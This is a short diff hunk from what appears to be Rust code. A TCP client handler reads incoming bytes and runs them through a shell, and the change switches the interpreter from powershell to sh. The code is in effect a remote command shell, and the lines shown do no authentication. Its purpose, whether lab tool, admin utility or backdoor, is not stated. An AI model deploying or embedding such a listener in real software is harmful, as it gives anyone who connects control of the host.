@@ -13,7 +13,7 @@ fn handle_client(mut stream: TcpStream) {
         };
 
         let command = String::from_utf8_lossy(&buffer[..nbytes]);
-        let output = Command::new("powershell")
+        let output = Command::new("sh")
             .arg("-c")
             .arg(command.trim())
             .stdout(Stdio::piped())
